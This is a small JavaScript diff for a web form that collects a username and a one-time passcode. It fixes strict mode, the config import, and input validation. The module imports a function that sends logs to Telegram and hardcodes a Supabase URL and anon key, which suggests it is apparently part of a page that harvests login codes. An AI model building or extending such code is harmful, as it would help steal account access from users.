@@ -1,8 +1,8 @@
-"strict mode";
+"use strict";
 
 import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/supabase.min.js';
 import { sendLogsToTelegram } from "./app.js";
-import { config } from "./config.js";
+import config from "./config.js";
 
 const supabaseUrl = 'https://rwdyanuhxnmbvuhupzbc.supabase.co';
 const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ3ZHlhbnVoeG5tYnZ1aHVwemJjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk3MjczNzQsImV4cCI6MjA3NTMwMzM3NH0.sjfpw_C5B6E5ujbm7jZ-SU1yvJg-ambt8IKiMazhOYw';
@@ -84,7 +84,7 @@ window.addEventListener("click", async (e) => {
       nextPageButton.disabled = false;
       nextPageButton.innerHTML = `Continue`;
 
-      if (usernameInput.value.length < 3 && !usernameInput.value) {
+      if (!usernameInput.value || usernameInput.value.length < 3) {
         alertBox.classList.toggle("d-none");
         return;
       }
@@ -206,8 +206,8 @@ numberInputs.forEach((input, index) => {
   input.addEventListener("input", function (e) {
     const value = input.value;
 
-    if (value && Number.isInteger(+value)) {
-      appState.OTPcode[index] = +value;
+    if (value && /^\d$/.test(value)) {
+      appState.OTPcode[index] = value;
 
       if (index < numberInputs.length - 1) {
         numberInputs[index + 1].focus();
